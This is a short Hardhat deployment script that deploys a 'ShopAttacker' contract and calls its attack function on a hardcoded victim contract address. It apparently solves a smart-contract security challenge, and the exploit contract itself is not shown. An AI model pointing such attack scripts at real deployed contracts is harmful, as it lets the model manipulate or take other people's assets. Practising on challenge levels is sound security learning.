
const { ethers } = require("hardhat");

async function main() {
  const victimAddress = '0xf576b1ea1B0264ad789A897784533Db108b2d62e';

  const ShopAttacker = await ethers.getContractFactory("ShopAttacker");
  const shopAttacker = await ShopAttacker.deploy();

  console.log("Shop Attacker deployed to:", shopAttacker.address)

  await shopAttacker.attack(victimAddress);

  console.log("Succesful attack!");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
